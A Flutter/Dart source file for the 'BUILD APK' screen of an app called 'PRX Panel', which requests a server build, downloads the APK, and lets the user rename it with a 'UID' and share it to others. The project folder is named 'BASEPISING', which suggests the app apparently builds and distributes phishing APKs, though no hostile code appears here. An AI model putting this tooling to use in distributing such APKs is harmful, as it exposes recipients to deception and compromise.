import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:share_plus/share_plus.dart';
import 'package:path_provider/path_provider.dart';
import 'package:permission_handler/permission_handler.dart';
import 'api.dart';

class BuildApkPage extends StatefulWidget {
  final String sessionKey;
  final String username;
  const BuildApkPage({super.key, required this.sessionKey, required this.username});

  @override
  State<BuildApkPage> createState() => _BuildApkPageState();
}

class _BuildApkPageState extends State<BuildApkPage> {
  bool _building = false;
  bool _downloading = false;
  String _status = "IDLE";
  String _apkUrl = "";
  String _apkSize = "";
  final String _packageName = "com.sync.xxx";
  final String _appName = "PRX Panel";
  final List<String> _logs = [];
  double _progress = 0;
  Timer? _pollTimer;

  File? _apkFile;
  String _customName = "PRX_Panel";

  @override
  void initState() {
    super.initState();
    _addLog("[INFO] Build APK Panel", const Color(0xFFFFE74C));
    _addLog("[INFO] Project: $_appName ($_packageName)", const Color(0xFF888888));
    _addLog("[INFO] Tap BUILD untuk mulai", const Color(0xFF888888));
    _checkExistingApk();
  }

  @override
  void dispose() {
    _pollTimer?.cancel();
    super.dispose();
  }

  void _addLog(String log, [Color? color]) {
    if (!mounted) return;
    setState(() { _logs.add(log); });
  }

  Future<bool> _requestStoragePermission() async {
    if (Platform.isAndroid) {
      var status = await Permission.manageExternalStorage.status;
      if (!status.isGranted) {
        status = await Permission.manageExternalStorage.request();
      }
      if (!status.isGranted) {
        status = await Permission.storage.status;
        if (!status.isGranted) {
          status = await Permission.storage.request();
        }
      }
      if (!status.isGranted) {
        _addLog("[!] Storage permission denied", const Color(0xFFFF6B6B));
        if (mounted) {
          ScaffoldMessenger.of(context).showSnackBar(
            const SnackBar(content: Text("Izin storage diperlukan untuk download/share APK"), backgroundColor: Color(0xFFFF6B6B)),
          );
        }
        return false;
      }
    }
    return true;
  }

  Future<void> _checkExistingApk() async {
    try {
      final dir = await getTemporaryDirectory();
      final file = File('${dir.path}/PRX_Panel.apk');
      if (await file.exists()) {
        final size = await file.length();
        setState(() {
          _apkFile = file;
          _apkSize = '${(size / 1024 / 1024).toStringAsFixed(1)}MB';
          _status = "SUCCESS";
        });
        _addLog("[INFO] APK ditemukan: $_apkSize", const Color(0xFF39FF14));
      }
    } catch (_) {}
  }

  Future<void> _triggerBuild() async {
    if (_building) return;
    setState(() {
      _building = true;
      _status = "SENDING";
      _logs.clear();
      _apkUrl = "";
      _apkFile = null;
      _progress = 0;
    });
    _addLog("[...] Mengirim request build ke server...", const Color(0xFFFFE74C));
    try {
      final res = await http.post(
        Uri.parse('${ApiConfig.baseUrl}/api/build-apk'),
        body: jsonEncode({'key': widget.sessionKey, 'username': widget.username}),
        headers: {'Content-Type': 'application/json'},
      ).timeout(const Duration(seconds: 15));
      final data = jsonDecode(res.body);
      if (res.statusCode == 200 && data['success'] == true) {
        setState(() { _status = "BUILDING"; });
        _addLog("[OK] Build request dikirim!", const Color(0xFF39FF14));
        _addLog("[INFO] ${data['message'] ?? 'Menunggu build...'}", const Color(0xFF00D4FF));
        if (data['apkUrl'] != null) {
          _apkUrl = data['apkUrl'] ?? '';
          _apkSize = data['apkSize'] ?? '';
          await _downloadApkFile();
        } else {
          _pollBuildStatus();
        }
      } else {
        setState(() { _building = false; _status = "FALLBACK"; });
        _addLog("[!] ${data['error'] ?? 'Server tidak bisa build'}", const Color(0xFFFF6B6B));
        _showManualInstructions();
      }
    } catch (e) {
      setState(() { _building = false; _status = "FALLBACK"; });
      _addLog("[!] Server offline: $e", const Color(0xFFFF6B6B));
      _showManualInstructions();
    }
  }

  void _showManualInstructions() {
    _addLog("", const Color(0xFF888888));
    _addLog("=== BUILD MANUAL (PC) ===", const Color(0xFFFFE74C));
    _addLog("1. Buka terminal di PC", const Color(0xFFAAAAAA));
    _addLog("2. cd BASEPISING\\android", const Color(0xFFAAAAAA));
    _addLog("3. build_apk.bat", const Color(0xFFAAAAAA));
    _addLog("4. APK di: app\\build\\outputs\\apk\\release\\", const Color(0xFFAAAAAA));
  }

  void _pollBuildStatus() {
    _pollTimer?.cancel();
    _pollTimer = Timer.periodic(const Duration(seconds: 5), (timer) async {
      if (!mounted) { timer.cancel(); return; }
      try {
        final res = await http.get(
          Uri.parse('${ApiConfig.baseUrl}/api/build-status'),
        ).timeout(const Duration(seconds: 8));
        if (res.statusCode == 200) {
          final data = jsonDecode(res.body);
          final st = data['status'] ?? 'building';
          if (mounted) setState(() { _progress = (data['progress'] ?? 0).toDouble(); });
          if (st == 'done') {
            timer.cancel();
            _apkUrl = data['apkUrl'] ?? '';
            _apkSize = data['apkSize'] ?? '';
            _addLog("[SUCCESS] Build selesai!", const Color(0xFF39FF14));
            await _downloadApkFile();
          } else if (st == 'error') {
            timer.cancel();
            setState(() { _building = false; _status = "ERROR"; });
            _addLog("[ERROR] ${data['error'] ?? 'Build gagal'}", const Color(0xFFFF6B6B));
          }
        }
      } catch (_) {}
    });
  }

  Future<void> _downloadApkFile() async {
    if (_apkUrl.isEmpty) return;
    final hasPermission = await _requestStoragePermission();
    if (!hasPermission) {
      setState(() { _building = false; _downloading = false; _status = "ERROR"; });
      return;
    }
    try {
      setState(() { _downloading = true; });
      _addLog("[...] Downloading APK dari server...", const Color(0xFFFFE74C));
      final fullUrl = '${ApiConfig.baseUrl}$_apkUrl';
      final res = await http.get(Uri.parse(fullUrl)).timeout(const Duration(seconds: 120));
      if (res.statusCode == 200) {
        final dir = await getTemporaryDirectory();
        final file = File('${dir.path}/PRX_Panel.apk');
        await file.writeAsBytes(res.bodyBytes);
        final sizeMB = (res.bodyBytes.length / 1024 / 1024).toStringAsFixed(1);
        setState(() {
          _apkFile = file;
          _apkSize = '${sizeMB}MB';
          _building = false;
          _status = "SUCCESS";
          _downloading = false;
        });
        _addLog("[DONE] APK siap! Size: ${sizeMB}MB", const Color(0xFF39FF14));
        _addLog("[INFO] Tap rename untuk ganti nama, tap share untuk kirim", const Color(0xFF00D4FF));
      } else {
        setState(() { _building = false; _downloading = false; _status = "ERROR"; });
        _addLog("[ERROR] Download gagal: ${res.statusCode}", const Color(0xFFFF6B6B));
      }
    } catch (e) {
      setState(() { _building = false; _downloading = false; _status = "ERROR"; });
      _addLog("[ERROR] Download gagal: $e", const Color(0xFFFF6B6B));
    }
  }

  void _showRenameDialog() {
    final ctrl = TextEditingController(text: _customName);
    showDialog(
      context: context,
      builder: (ctx) => AlertDialog(
        backgroundColor: const Color(0xFF1A1A2E),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16), side: const BorderSide(color: Color(0xFFFFE74C), width: 2)),
        title: const Text("RENAME APK", style: TextStyle(color: Colors.white, fontWeight: FontWeight.w900, fontFamily: 'Inter')),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            const Text("Masukkan nama baru untuk APK:", style: TextStyle(color: Color(0xFFAAAAAA), fontSize: 12, fontFamily: 'Inter')),
            const SizedBox(height: 12),
            TextField(
              controller: ctrl,
              style: const TextStyle(color: Colors.white, fontFamily: 'ShareTechMono', fontSize: 14),
              decoration: InputDecoration(
                hintText: "contoh: PRX_UID_abc123",
                hintStyle: const TextStyle(color: Color(0xFF555555)),
                filled: true,
                fillColor: const Color(0xFF0A0A0A),
                border: OutlineInputBorder(borderRadius: BorderRadius.circular(10), borderSide: const BorderSide(color: Color(0xFF333333))),
                focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(10), borderSide: const BorderSide(color: Color(0xFFFFE74C), width: 2)),
              ),
            ),
            const SizedBox(height: 8),
            const Text("File akan disimpan sebagai: nama.apk", style: TextStyle(color: Color(0xFF666666), fontSize: 10, fontFamily: 'ShareTechMono')),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(ctx),
            child: const Text("BATAL", style: TextStyle(color: Color(0xFF666666), fontFamily: 'Inter')),
          ),
          TextButton(
            onPressed: () {
              final newName = ctrl.text.trim();
              if (newName.isNotEmpty) {
                setState(() { _customName = newName; });
                _addLog("[OK] Nama diubah ke: ${newName}.apk", const Color(0xFF39FF14));
              }
              Navigator.pop(ctx);
            },
            child: const Text("SIMPAN", style: TextStyle(color: Color(0xFFFFE74C), fontWeight: FontWeight.w900, fontFamily: 'Inter')),
          ),
        ],
      ),
    );
  }

  Future<void> _shareApk() async {
    if (_apkFile == null || _downloading) return;
    final hasPermission = await _requestStoragePermission();
    if (!hasPermission) return;
    try {
      if (!await _apkFile!.exists()) {
        _addLog("[ERROR] File APK tidak ditemukan", const Color(0xFFFF6B6B));
        return;
      }
      _addLog("[...] Sharing ${_customName}.apk...", const Color(0xFFFFE74C));
      await Share.shareXFiles(
        [XFile(_apkFile!.path, mimeType: 'application/vnd.android.package-archive', name: '${_customName}.apk')],
        text: '$_appName - $_customName',
        subject: '${_customName}.apk',
      );
      _addLog("[OK] Share dialog opened!", const Color(0xFF39FF14));
    } catch (e) {
      _addLog("[ERROR] Share gagal: $e", const Color(0xFFFF6B6B));
    }
  }

  Color _statusColor() {
    switch (_status) {
      case "BUILDING": case "SENDING": return const Color(0xFFFFE74C);
      case "SUCCESS": return const Color(0xFF39FF14);
      case "ERROR": return const Color(0xFFFF6B6B);
      default: return const Color(0xFF666666);
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF0B0D14),
      appBar: AppBar(
        backgroundColor: const Color(0xFF111111),
        title: const Text("BUILD APK", style: TextStyle(color: Colors.white, fontWeight: FontWeight.w900, letterSpacing: 2, fontFamily: 'Inter')),
        leading: IconButton(icon: const Icon(Icons.arrow_back_rounded, color: Colors.white), onPressed: () => Navigator.pop(context)),
      ),
      body: SingleChildScrollView(
        padding: const EdgeInsets.all(16),
        child: Column(
          children: [
            Container(
              width: double.infinity,
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: const Color(0xFF181C28),
                borderRadius: BorderRadius.circular(14),
                border: Border.all(color: const Color(0xFF2A2F3E), width: 1.5),
              ),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    children: [
                      Container(
                        padding: const EdgeInsets.all(10),
                        decoration: BoxDecoration(color: const Color(0xFFFFE74C).withValues(alpha: 0.1), borderRadius: BorderRadius.circular(10)),
                        child: const Icon(Icons.android_rounded, color: Color(0xFFFFE74C), size: 24),
                      ),
                      const SizedBox(width: 12),
                      Expanded(
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Text(_appName, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.w900, fontSize: 16, fontFamily: 'Inter')),
                            Text(_packageName, style: const TextStyle(color: Color(0xFF666666), fontSize: 12, fontFamily: 'Inter')),
                          ],
                        ),
                      ),
                      Container(
                        padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
                        decoration: BoxDecoration(color: _statusColor().withValues(alpha: 0.15), borderRadius: BorderRadius.circular(8)),
                        child: Text(_status, style: TextStyle(color: _statusColor(), fontSize: 11, fontWeight: FontWeight.w900, fontFamily: 'Inter', letterSpacing: 1)),
                      ),
                    ],
                  ),
                  const SizedBox(height: 12),
                  if (_building || _downloading) ...[
                    ClipRRect(
                      borderRadius: BorderRadius.circular(4),
                      child: LinearProgressIndicator(
                        value: _progress > 0 ? _progress : null,
                        backgroundColor: const Color(0xFF222222),
                        valueColor: const AlwaysStoppedAnimation(Color(0xFFFFE74C)),
                        minHeight: 6,
                      ),
                    ),
                    const SizedBox(height: 12),
                  ],
                  if (_status == "SUCCESS" && _apkFile != null) ...[
                    Container(
                      width: double.infinity,
                      padding: const EdgeInsets.all(12),
                      decoration: BoxDecoration(color: const Color(0xFF39FF14).withValues(alpha: 0.1), borderRadius: BorderRadius.circular(10), border: Border.all(color: const Color(0xFF39FF14).withValues(alpha: 0.3), width: 1)),
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          const Text("APK SIAP", style: TextStyle(color: Color(0xFF39FF14), fontSize: 11, fontWeight: FontWeight.w900, letterSpacing: 1, fontFamily: 'Inter')),
                          const SizedBox(height: 6),
                          Row(
                            children: [
                              const Icon(Icons.insert_drive_file_rounded, color: Color(0xFF39FF14), size: 16),
                              const SizedBox(width: 8),
                              Expanded(
                                child: Text("${_customName}.apk", style: const TextStyle(color: Colors.white, fontSize: 13, fontWeight: FontWeight.w700, fontFamily: 'ShareTechMono')),
                              ),
                              Text(_apkSize, style: const TextStyle(color: Color(0xFF888888), fontSize: 11, fontFamily: 'ShareTechMono')),
                            ],
                          ),
                        ],
                      ),
                    ),
                    const SizedBox(height: 10),
                  ],
                  Container(
                    width: double.infinity,
                    padding: const EdgeInsets.all(10),
                    decoration: BoxDecoration(color: const Color(0xFFFFE74C).withValues(alpha: 0.08), borderRadius: BorderRadius.circular(8)),
                    child: const Row(
                      children: [
                        Icon(Icons.info_outline_rounded, color: Color(0xFFFFE74C), size: 16),
                        SizedBox(width: 8),
                        Expanded(
                          child: Text(
                            "Rename APK dengan UID sebelum share ke orang lain.",
                            style: TextStyle(color: Color(0xFFFFE74C), fontSize: 11, fontFamily: 'Inter', height: 1.3),
                          ),
                        ),
                      ],
                    ),
                  ),
                  const SizedBox(height: 14),
                  Row(
                    children: [
                      Expanded(
                        child: GestureDetector(
                          onTap: (_building || _downloading) ? null : _triggerBuild,
                          child: Container(
                            padding: const EdgeInsets.symmetric(vertical: 12),
                            decoration: BoxDecoration(
                              color: (_building || _downloading) ? const Color(0xFF333333) : const Color(0xFFFFE74C),
                              borderRadius: BorderRadius.circular(10),
                            ),
                            child: Center(
                              child: (_building || _downloading)
                                  ? const SizedBox(width: 18, height: 18, child: CircularProgressIndicator(strokeWidth: 2, color: Colors.white))
                                  : Text(_apkFile != null ? "REBUILD" : "BUILD APK", style: const TextStyle(color: Colors.black, fontWeight: FontWeight.w900, fontSize: 13, fontFamily: 'Inter', letterSpacing: 1)),
                            ),
                          ),
                        ),
                      ),
                    ],
                  ),
                  if (_apkFile != null) ...[
                    const SizedBox(height: 10),
                    Row(
                      children: [
                        Expanded(
                          child: GestureDetector(
                            onTap: _showRenameDialog,
                            child: Container(
                              padding: const EdgeInsets.symmetric(vertical: 12),
                              decoration: BoxDecoration(color: const Color(0xFFFF6B6B), borderRadius: BorderRadius.circular(10)),
                              child: const Center(child: Text("RENAME", style: TextStyle(color: Colors.white, fontWeight: FontWeight.w900, fontSize: 12, fontFamily: 'Inter', letterSpacing: 1))),
                            ),
                          ),
                        ),
                        const SizedBox(width: 10),
                        Expanded(
                          child: GestureDetector(
                            onTap: _shareApk,
                            child: Container(
                              padding: const EdgeInsets.symmetric(vertical: 12),
                              decoration: BoxDecoration(color: const Color(0xFF39FF14), borderRadius: BorderRadius.circular(10)),
                              child: const Center(child: Text("SHARE APK", style: TextStyle(color: Colors.black, fontWeight: FontWeight.w900, fontSize: 12, fontFamily: 'Inter', letterSpacing: 1))),
                            ),
                          ),
                        ),
                      ],
                    ),
                  ],
                ],
              ),
            ),
            const SizedBox(height: 14),
            Container(
              width: double.infinity,
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                color: const Color(0xFF0A0A0A),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: const Color(0xFF222222), width: 1),
              ),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  const Row(
                    children: [
                      Icon(Icons.terminal_rounded, color: Color(0xFF00D4FF), size: 16),
                      SizedBox(width: 8),
                      Text("BUILD LOG", style: TextStyle(color: Color(0xFF00D4FF), fontSize: 11, fontWeight: FontWeight.w900, letterSpacing: 1, fontFamily: 'Inter')),
                    ],
                  ),
                  const SizedBox(height: 8),
                  Container(
                    width: double.infinity,
                    constraints: const BoxConstraints(minHeight: 80, maxHeight: 250),
                    padding: const EdgeInsets.all(10),
                    decoration: BoxDecoration(color: const Color(0xFF050505), borderRadius: BorderRadius.circular(8)),
                    child: _logs.isEmpty
                        ? const Text("Tap BUILD APK untuk mulai", style: TextStyle(color: Color(0xFF444444), fontSize: 11, fontFamily: 'ShareTechMono'))
                        : SingleChildScrollView(
                            child: Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: _logs.map((log) {
                                Color c = const Color(0xFF888888);
                                if (log.contains('[SUCCESS]') || log.contains('[OK]') || log.contains('[DONE]')) c = const Color(0xFF39FF14);
                                else if (log.contains('[ERROR]') || log.contains('[!]')) c = const Color(0xFFFF6B6B);
                                else if (log.contains('[INFO]')) c = const Color(0xFF00D4FF);
                                else if (log.contains('[APK]') || log.contains('=== BUILD')) c = const Color(0xFFFFE74C);
                                return Padding(
                                  padding: const EdgeInsets.symmetric(vertical: 1),
                                  child: Text(log, style: TextStyle(color: c, fontSize: 11, fontFamily: 'ShareTechMono', height: 1.4)),
                                );
                              }).toList(),
                            ),
                          ),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }
}
